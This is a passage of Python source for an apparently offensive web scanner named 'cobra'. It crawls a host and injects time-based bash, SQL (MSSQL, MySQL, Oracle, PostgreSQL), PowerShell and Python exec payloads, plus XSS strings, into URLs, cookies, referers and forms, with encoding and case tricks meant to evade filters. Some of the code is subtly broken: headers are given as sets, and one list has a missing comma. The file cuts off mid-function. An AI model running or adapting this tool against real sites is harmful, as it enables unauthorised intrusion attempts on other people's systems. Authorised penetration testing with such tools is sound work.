import random
import re
import string
import time
import urllib.parse
from urllib.error import HTTPError
from TheSilent.clear import clear
from TheSilent.kitten_crawler import kitten_crawler
from TheSilent.puppy_requests import text

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

def random_case(mal):
    my_random = ""
    for char in mal:
        if random.choice([True, False]):
            my_random += char.upper()
        else:
            my_random += char.lower()
    
    return my_random

def random_string():
    length = random.randint(8, 35)
    random_string = "".join(random.choices(string.ascii_letters + string.digits, k=length))
    
    return random_string

def mal_percent_encoding(mal):
    gather = []

    gather.append(urllib.parse.quote(mal))
    gather.append(urllib.parse.quote(urllib.parse.quote(mal)))
    gather.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
    gather.append(urllib.parse.quote_plus(mal))
    gather.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
    gather.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
    gather.append(random_case(urllib.parse.quote(mal)))
    gather.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
    gather.append(random_case(urllib.parse.quote_plus(mal)))
    gather.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))

    return gather

def mal_changer(mal):
    gather = []
    gather.append(f"./{mal}")
    gather.append(f"../{mal}")
    gather.append("".join(["&#x{:x}".format(ord(char)) for char in mal]))
    gather.append(mal.replace("'", "\\'").replace('"', '\\"'))
    gather.append("".join(["\\u00{:x}".format(ord(char)) for char in mal]))
    gather.append(random_case(f"./{mal}"))
    gather.append(random_case(f"../{mal}"))
    gather.append(random_case("".join(["&#x{:x}".format(ord(char)) for char in mal])))
    gather.append(random_case(mal.replace("'", "\\'").replace('"', '\\"')))
    gather.append(random_case("".join(["\\u00{:x}".format(ord(char)) for char in mal])))

    return gather

def mal_url_parser(mal):
    gather = []

    gather.append(random_case(mal))
    gather.append(random_string() + " " + mal)
    gather.append(random_case(random_string() + mal))

    new_gather = gather[:]
    for i in new_gather:
        results = (mal_changer(i))
        for result in results:
            gather.append(result)
            
    new_gather = gather[:]
    for i in new_gather:
        results = (mal_percent_encoding(i))
        for result in results:
            gather.append(result)

    return gather

def cobra(host,delay=0,crawl=1):
    clear()
    host = host.rstrip("/")
    
    hits = []

    mal_bash = [r"sleep 60",
                r"\s\l\e\e\p \6\0",
                r"$(echo -e '\x73\x6C\x65\x65\x70\x20\x36\x30')",
                r"sleep 60 #",
                r"\s\l\e\e\p \6\0 #",
                r"$(echo -e '\x73\x6C\x65\x65\x70\x20\x36\x30') #"]
 
    mal_emoji = [r"&#128124;",
                 r"&#128293;",
                 r"&#128568;",
                 r"&#128049;",
                 r"&#127814;",
                 r"&#x1F47C",
                 r"&#x1F525",
                 r"&#x1F638",
                 r"&#x1F431",
                 r"&#x1F346"]

    mal_mssql = [r'WAITFOR DELAY "00:01"',
                 r'1 AND WAITFOR DELAY "00:01"',
                 r'1 OR WAITFOR DELAY "00:01"',
                 r'" 1 AND WAITFOR DELAY "00:01"',
                 r"' 1 AND WAITFOR DELAY '00:01'",
                 r'" 1 OR WAITFOR DELAY "00:01"',
                 r"' 1 OR WAITFOR DELAY '00:01'",
                 r'AND WAITFOR DELAY "00:01"',
                 r'OR WAITFOR DELAY "00:01"',
                 r'" AND WAITFOR DELAY "00:01"',
                 r"' OR WAITFOR DELAY '00:01'",
                 r'WAITFOR DELAY "00:01" --',
                 r'1 AND WAITFOR DELAY "00:01" --',
                 r'1 OR WAITFOR DELAY "00:01" --',
                 r'" 1 AND WAITFOR DELAY "00:01" --',
                 r"' 1 AND WAITFOR DELAY '00:01' --",
                 r'" 1 OR WAITFOR DELAY "00:01" --',
                 r"' 1 OR WAITFOR DELAY '00:01' --",
                 r'AND WAITFOR DELAY "00:01" --',
                 r'OR WAITFOR DELAY "00:01" --',
                 r'" AND WAITFOR DELAY "00:01" --',
                 r"' OR WAITFOR DELAY '00:01' --"]

    mal_mysql = [r"SELECT SLEEP(60);",
                 r"1 AND SELECT SLEEP(60);",
                 r"1 OR SELECT SLEEP(60);",
                 r"' 1 AND SELECT SLEEP(60);",
                 r'" 1 AND SELECT SLEEP(60);',
                 r"' 1 OR SELECT SLEEP(60);",
                 r'" 1 OR SELECT SLEEP(60);',
                 r'AND SELECT SLEEP(60);"',
                 r'OR SELECT SLEEP(60);',
                 r'" AND SELECT SLEEP(60);',
                 r"' OR SELECT SLEEP(60);",
                 r"SELECT SLEEP(60); --",
                 r"1 AND SELECT SLEEP(60); --",
                 r"1 OR SELECT SLEEP(60); --",
                 r"' 1 AND SELECT SLEEP(60); --",
                 r'" 1 AND SELECT SLEEP(60); --',
                 r"' 1 OR SELECT SLEEP(60); --",
                 r'" 1 OR SELECT SLEEP(60); --',
                 r'AND SELECT SLEEP(60);" --',
                 r'OR SELECT SLEEP(60); --',
                 r'" AND SELECT SLEEP(60); --',
                 r"' OR SELECT SLEEP(60); --"]

    mal_oracle = [r"DBMS_LOCK.sleep(60);",
                  r"1 AND DBMS_LOCK.sleep(60);",
                  r"1 OR DBMS_LOCK.sleep(60);",
                  r"' 1 AND DBMS_LOCK.sleep(60);",
                  r'" 1 AND DBMS_LOCK.sleep(60);',
                  r"' 1 OR DBMS_LOCK.sleep(60);",
                  r'" 1 OR DBMS_LOCK.sleep(60);',
                  r"DBMS_SESSION.sleep(60);"
                  r"1 AND DBMS_SESSION.sleep(60);",
                  r"1 OR DBMS_SESSION.sleep(60);",
                  r"' 1 AND DBMS_SESSION.sleep(60);",
                  r'" 1 AND DBMS_SESSION.sleep(60);',
                  r"' 1 OR DBMS_SESSION.sleep(60);",
                  r'" 1 OR DBMS_SESSION.sleep(60);',
                  r'AND DBMS_LOCK.sleep(60)',
                  r'OR DBMS_LOCK.sleep(60)',
                  r'" AND DBMS_LOCK.sleep(60)',
                  r"' OR DBMS_LOCK.sleep(60)",
                  r'AND DBMS_SESSION.sleep(60);',
                  r'OR DBMS_SESSION.sleep(60);',
                  r'" AND DBMS_SESSION.sleep(60);',
                  r"' OR DBMS_SESSION.sleep(60);",
                  r"DBMS_LOCK.sleep(60); --",
                  r"1 AND DBMS_LOCK.sleep(60); --",
                  r"1 OR DBMS_LOCK.sleep(60); --",
                  r"' 1 AND DBMS_LOCK.sleep(60); --",
                  r'" 1 AND DBMS_LOCK.sleep(60); --',
                  r"' 1 OR DBMS_LOCK.sleep(60); --",
                  r'" 1 OR DBMS_LOCK.sleep(60); --',
                  r"DBMS_SESSION.sleep(60); --"
                  r"1 AND DBMS_SESSION.sleep(60); --",
                  r"1 OR DBMS_SESSION.sleep(60);--",
                  r"' 1 AND DBMS_SESSION.sleep(60); --",
                  r'" 1 AND DBMS_SESSION.sleep(60); --',
                  r"' 1 OR DBMS_SESSION.sleep(60); --",
                  r'" 1 OR DBMS_SESSION.sleep(60); --',
                  r'AND DBMS_LOCK.sleep(60) --',
                  r'OR DBMS_LOCK.sleep(60) --',
                  r'" AND DBMS_LOCK.sleep(60) --',
                  r"' OR DBMS_LOCK.sleep(60) --",
                  r'AND DBMS_SESSION.sleep(60); --',
                  r'OR DBMS_SESSION.sleep(60); --',
                  r'" AND DBMS_SESSION.sleep(60); --',
                  r"' OR DBMS_SESSION.sleep(60); --"]
    

    mal_php = [r"sleep(60);"]

    mal_postgresql = [r"pg_sleep(60);",
                      r"1 AND pg_sleep(60);",
                      r"1 OR pg_sleep(60);",
                      r"' 1 AND pg_sleep(60);",
                      r'" 1 AND pg_sleep(60);',
                      r"' 1 OR pg_sleep(60);",
                      r'" 1 OR pg_sleep(60);',
                      r"PERFORM pg_sleep(60);",
                      r"1 AND PERFORM pg_sleep(60);",
                      r"1 OR PERFORM pg_sleep(60);",
                      r"' 1 AND PERFORM pg_sleep(60);",
                      r'" 1 AND PERFORM pg_sleep(60);',
                      r"' 1 OR PERFORM pg_sleep(60);",
                      r'" 1 OR PERFORM pg_sleep(60);',
                      r"SELECT pg_sleep(60);",
                      r"1 AND SELECT pg_sleep(60);",
                      r"1 OR SELECT pg_sleep(60);",
                      r"' 1 AND SELECT pg_sleep(60);",
                      r'" 1 AND SELECT pg_sleep(60);',
                      r"' 1 OR SELECT pg_sleep(60);",
                      r'" 1 OR SELECT pg_sleep(60);',
                      r'AND pg_sleep(60);',
                      r'OR pg_sleep(60);',
                      r'" AND pg_sleep(60);',
                      r"' OR pg_sleep(60);",
                      r'AND PERFORM pg_sleep(60);',
                      r'OR PERFORM pg_sleep(60);',
                      r'" AND PERFORM pg_sleep(60);',
                      r"' OR PERFORM pg_sleep(60);",
                      r'AND SELECT pg_sleep(60);',
                      r'OR SELECT pg_sleep(60);',
                      r'" AND SELECT pg_sleep(60);',
                      r"' OR SELECT pg_sleep(60);",
                      r"pg_sleep(60); --",
                      r"1 AND pg_sleep(60); --",
                      r"1 OR pg_sleep(60); --",
                      r"' 1 AND pg_sleep(60); --",
                      r'" 1 AND pg_sleep(60); --',
                      r"' 1 OR pg_sleep(60); --",
                      r'" 1 OR pg_sleep(60); --',
                      r"PERFORM pg_sleep(60); --",
                      r"1 AND PERFORM pg_sleep(60); --",
                      r"1 OR PERFORM pg_sleep(60); --",
                      r"' 1 AND PERFORM pg_sleep(60); --",
                      r'" 1 AND PERFORM pg_sleep(60); --',
                      r"' 1 OR PERFORM pg_sleep(60); --",
                      r'" 1 OR PERFORM pg_sleep(60); --',
                      r"SELECT pg_sleep(60); --",
                      r"1 AND SELECT pg_sleep(60); --",
                      r"1 OR SELECT pg_sleep(60); --",
                      r"' 1 AND SELECT pg_sleep(60); --",
                      r'" 1 AND SELECT pg_sleep(60); --',
                      r"' 1 OR SELECT pg_sleep(60); --",
                      r'" 1 OR SELECT pg_sleep(60); --',
                      r'AND pg_sleep(60); --',
                      r'OR pg_sleep(60); --',
                      r'" AND pg_sleep(60); --',
                      r"' OR pg_sleep(60); --",
                      r'AND PERFORM pg_sleep(60); --',
                      r'OR PERFORM pg_sleep(60); --',
                      r'" AND PERFORM pg_sleep(60); --',
                      r"' OR PERFORM pg_sleep(60); --",
                      r'AND SELECT pg_sleep(60); --',
                      r'OR SELECT pg_sleep(60); --',
                      r'" AND SELECT pg_sleep(60); --',
                      r"' OR SELECT pg_sleep(60); --"]

    mal_powershell = [r"start-sleep -seconds 60",
                      r"start-sleep -seconds 60 #"]

    mal_python = [r"time.sleep(60)",
                  r"__import__('time').sleep(60)",
                  r"__import__('os').system('sleep 60')",
                  r'eval("__import__(\'time\').sleep(60)")',
                  r'eval("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("__import__(\'time\').sleep(60)")',
                  r'exec("__import__(\'os\').system(\'sleep 60\')")',
                  r'exec("import time\ntime.sleep(60)',
                  r'exec("import os\nos.system(\'sleep 60\')")',
                  r"time.sleep(60) #",
                  r"__import__('time').sleep(60) #",
                  r"__import__('os').system('sleep 60') #",
                  r'eval("__import__(\'time\').sleep(60)") #',
                  r'eval("__import__(\'os\').system(\'sleep 60\')") #',
                  r'exec("__import__(\'time\').sleep(60)") #',
                  r'exec("__import__(\'os\').system(\'sleep 60\')") #',
                  r'exec("import time\ntime.sleep(60) #',
                  r'exec("import os\nos.system(\'sleep 60\')") #']

    mal_xss = [r"<iframe>cobra</iframe>",
               r"<p>cobra</p>",
               r"<script>alert('cobra')</script>",
               r"<script>prompt('cobra')</script>",
               r"<strong>cobra</strong>",
               r"<style>body{background-color:red;}</style>",
               r"<title>cobra</title>",
               r"' <iframe>cobra</iframe>",
               r"' <p>cobra</p>",
               r"' <script>alert('cobra')</script>",
               r"' <script>prompt('cobra')</script>",
               r"' <strong>cobra</strong>",
               r"' <style>body{background-color:red;}</style>",
               r"' <title>cobra</title>",
               r'" <iframe>cobra</iframe>',
               r'" <p>cobra</p>',
               r'" <script>alert("cobra")</script>',
               r'" <script>prompt("cobra")</script>',
               r'" <strong>cobra</strong>',
               r'" <style>body{background-color:red;}</style>',
               r'" <title>cobra</title>',
               r"'/> <iframe>cobra</iframe>",
               r"'/> <p>cobra</p>",
               r"'/> <script>alert('cobra')</script>",
               r"'/> <script>prompt('cobra')</script>",
               r"'/> <strong>cobra</strong>",
               r"'/> <style>body{background-color:red;}</style>",
               r"'/> <title>cobra</title>",
               r'"/> <iframe>cobra</iframe>',
               r'"/> <p>cobra</p>',
               r'"/> <script>alert("cobra")</script>',
               r'"/> <script>prompt("cobra")</script>',
               r'"/> <strong>cobra</strong>',
               r'"/> <style>body{background-color:red;}</style>',
               r'"/> <title>cobra</title>',
               r"'> <iframe>cobra</iframe>",
               r"'> <p>cobra</p>",
               r"'> <script>alert('cobra')</script>",
               r"'> <script>prompt('cobra')</script>",
               r"'> <strong>cobra</strong>",
               r"'> <style>body{background-color:red;}</style>",
               r"'> <title>cobra</title>",
               r'"> <iframe>cobra</iframe>',
               r'"> <p>cobra</p>',
               r'"> <script>alert("cobra")</script>',
               r'"> <script>prompt("cobra")</script>',
               r'"> <strong>cobra</strong>',
               r'"> <style>body{background-color:red;}</style>',
               r'"> <title>cobra</title>',
               r"/> <iframe>cobra</iframe>",
               r"/> <p>cobra</p>",
               r"/> <script>alert('cobra')</script>",
               r"/> <script>prompt('cobra')</script>",
               r"/> <strong>cobra</strong>",
               r"/> <style>body{background-color:red;}</style>",
               r"/> <title>cobra</title>",
               r"> <iframe>cobra</iframe>",
               r"> <p>cobra</p>",
               r"> <script>alert('cobra')</script>",
               r"> <script>prompt('cobra')</script>",
               r"> <strong>cobra</strong>",
               r"> <style>body{background-color:red;}</style>",
               r"> <title>cobra</title>",
               r"<iframe>cobra</iframe> //",
               r"<p>cobra</p> //",
               r"<script>alert('cobra')</script> //",
               r"<script>prompt('cobra')</script> //",
               r"<strong>cobra</strong> //",
               r"<style>body{background-color:red;}</style> //",
               r"<title>cobra</title> //",
               r"' <iframe>cobra</iframe> //",
               r"' <p>cobra</p> /",
               r"' <script>alert('cobra')</script> //",
               r"' <script>prompt('cobra')</script> //",
               r"' <strong>cobra</strong> //",
               r"' <style>body{background-color:red;}</style> //",
               r"' <title>cobra</title> //",
               r'" <iframe>cobra</iframe> //',
               r'" <p>cobra</p> //',
               r'" <script>alert("cobra")</script> //',
               r'" <script>prompt("cobra")</script> //',
               r'" <strong>cobra</strong> //',
               r'" <style>body{background-color:red;}</style> //',
               r'" <title>cobra</title> //',
               r"'/> <iframe>cobra</iframe> //",
               r"'/> <p>cobra</p> //",
               r"'/> <script>alert('cobra')</script> //",
               r"'/> <script>prompt('cobra')</script> //",
               r"'/> <strong>cobra</strong> //",
               r"'/> <style>body{background-color:red;}</style> //",
               r"'/> <title>cobra</title> //",
               r'"/> <iframe>cobra</iframe> //',
               r'"/> <p>cobra</p> //',
               r'"/> <script>alert("cobra")</script> //',
               r'"/> <script>prompt("cobra")</script> //',
               r'"/> <strong>cobra</strong> //',
               r'"/> <style>body{background-color:red;}</style> //',
               r'"/> <title>cobra</title> //',
               r"'> <iframe>cobra</iframe> //",
               r"'> <p>cobra</p> //",
               r"'> <script>alert('cobra')</script> //",
               r"'> <script>prompt('cobra')</script> //",
               r"'> <strong>cobra</strong> //",
               r"'> <style>body{background-color:red;}</style> //",
               r"'> <title>cobra</title> //",
               r'"> <iframe>cobra</iframe> //',
               r'"> <p>cobra</p> //',
               r'"> <script>alert("cobra")</script> //',
               r'"> <script>prompt("cobra")</script> //',
               r'"> <strong>cobra</strong> //',
               r'"> <style>body{background-color:red;}</style> //',
               r'"> <title>cobra</title> //',
               r"/> <iframe>cobra</iframe> //",
               r"/> <p>cobra</p> //",
               r"/> <script>alert('cobra')</script> //",
               r"/> <script>prompt('cobra')</script> //",
               r"/> <strong>cobra</strong> //",
               r"/> <style>body{background-color:red;}</style> //",
               r"/> <title>cobra</title> //",
               r"> <iframe>cobra</iframe> //",
               r"> <p>cobra</p> //",
               r"> <script>alert('cobra')</script> //",
               r"> <script>prompt('cobra')</script> //",
               r"> <strong>cobra</strong> //",
               r"> <style>body{background-color:red;}</style> //",
               r"> <title>cobra</title> //",
               r"<iframe>cobra</iframe> <!--",
               r"<p>cobra</p> <!--",
               r"<script>alert('cobra')</script> <!--",
               r"<script>prompt('cobra')</script> <!--",
               r"<strong>cobra</strong> <!--",
               r"<style>body{background-color:red;}</style> <!--",
               r"<title>cobra</title> <!--",
               r"' <iframe>cobra</iframe> <!--",
               r"' <p>cobra</p> <!--",
               r"' <script>alert('cobra')</script> <!--",
               r"' <script>prompt('cobra')</script> <!--",
               r"' <strong>cobra</strong> <!--",
               r"' <style>body{background-color:red;}</style> <!--",
               r"' <title>cobra</title> <!--",
               r'" <iframe>cobra</iframe> <!--',
               r'" <p>cobra</p> <!--',
               r'" <script>alert("cobra")</script> <!--',
               r'" <script>prompt("cobra")</script> <!--',
               r'" <strong>cobra</strong> <!--',
               r'" <style>body{background-color:red;}</style> <!--',
               r'" <title>cobra</title> <!--',
               r"'/> <iframe>cobra</iframe> <!--",
               r"'/> <p>cobra</p> <!--",
               r"'/> <script>alert('cobra')</script> <!--",
               r"'/> <script>prompt('cobra')</script> <!--",
               r"'/> <strong>cobra</strong> <!--",
               r"'/> <style>body{background-color:red;}</style> <!--",
               r"'/> <title>cobra</title> <!--",
               r'"/> <iframe>cobra</iframe> <!--',
               r'"/> <p>cobra</p> <!--',
               r'"/> <script>alert("cobra")</script> <!--',
               r'"/> <script>prompt("cobra")</script> <!--',
               r'"/> <strong>cobra</strong> <!--',
               r'"/> <style>body{background-color:red;}</style> <!--',
               r'"/> <title>cobra</title> <!--',
               r"'> <iframe>cobra</iframe> <!--",
               r"'> <p>cobra</p> <!--",
               r"'> <script>alert('cobra')</script> <!--",
               r"'> <script>prompt('cobra')</script> <!--",
               r"'> <strong>cobra</strong> <!--",
               r"'> <style>body{background-color:red;}</style> <!--",
               r"'> <title>cobra</title> <!--",
               r'"> <iframe>cobra</iframe> <!--',
               r'"> <p>cobra</p> <!--',
               r'"> <script>alert("cobra")</script> <!--',
               r'"> <script>prompt("cobra")</script> <!--',
               r'"> <strong>cobra</strong> <!--',
               r'"> <style>body{background-color:red;}</style> <!--',
               r'"> <title>cobra</title> <!--',
               r"/> <iframe>cobra</iframe> <!--",
               r"/> <p>cobra</p> <!--",
               r"/> <script>alert('cobra')</script> <!--",
               r"/> <script>prompt('cobra')</script> <!--",
               r"/> <strong>cobra</strong> <!--",
               r"/> <style>body{background-color:red;}</style> <!--",
               r"/> <title>cobra</title> <!--",
               r"> <iframe>cobra</iframe> <!--",
               r"> <p>cobra</p> <!--",
               r"> <script>alert('cobra')</script> <!--",
               r"> <script>prompt('cobra')</script> <!--",
               r"> <strong>cobra</strong> <!--",
               r"> <style>body{background-color:red;}</style> <!--",
               r"> <title>cobra</title> <!--"]

    init_mal_bash = mal_bash[:]
    for mal in init_mal_bash:
        results = mal_url_parser(mal)
        for result in results:
            mal_bash.append(result)
            
    init_mal_mssql = mal_mssql[:]
    for mal in init_mal_mssql:
        results = mal_url_parser(mal)
        for result in results:
            mal_mssql.append(result)

    init_mal_mysql = mal_mysql[:]
    for mal in init_mal_mysql:
        results = mal_url_parser(mal)
        for result in results:
            mal_mysql.append(result)

    init_mal_oracle = mal_oracle[:]
    for mal in init_mal_oracle:
        results = mal_url_parser(mal)
        for result in results:
            mal_oracle.append(result)

    init_mal_php = mal_php[:]
    for mal in init_mal_php:
        results = mal_url_parser(mal)
        for result in results:
            mal_php.append(result)       
        
    init_mal_postgresql = mal_postgresql[:]
    for mal in init_mal_postgresql:
        results = mal_url_parser(mal)
        for result in results:
            mal_postgresql.append(result)

    init_mal_powershell = mal_powershell[:]
    for mal in init_mal_powershell:
        results = mal_url_parser(mal)
        for result in results:
            mal_powershell.append(result)
            
    init_mal_python = mal_python[:]
    for mal in init_mal_python:
        results = mal_url_parser(mal)
        for result in results:
            mal_python.append(result)

    init_mal_xss = mal_xss[:]
    for mal in init_mal_xss:
        results = mal_url_parser(mal)
        for result in results:
            mal_xss.append(result)

    hosts = kitten_crawler(host,delay,crawl)

    clear()
    for _ in hosts:
        if urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(_).netloc:
            try:
                forms = re.findall("<form[.\n]+form>",text(_).replace("\n",""))

            except HTTPError as error:
                forms = []

            except:
                forms = []

            # check for bash injection
            for mal in mal_bash:
                print(CYAN + f"checking: {_} with bash injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"bash injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"bash injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"bash injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"bash injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for emoji injection
            for mal in mal_emoji:
                print(CYAN + f"checking: {_} with emoji injection payload {mal}")
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"emoji injection in url: {_}/{mal}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"emoji injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"emoji injection in referer ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {action} | {field_dict}")

                                else:
                                    data = text(_,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        pass

                    except:
                        pass

            # check for mssql injection
            for mal in mal_mssql:
                print(CYAN + f"checking: {_} with mssql injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mssql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mssql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"mssql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"mssql injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                
            # check for mysql injection
            for mal in mal_mysql:
                print(CYAN + f"checking: {_} with mysql injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mysql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mysql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mysql injection in referer ({mal}): {_}")

                except HTTPError as error:
                   if error.code == 504:
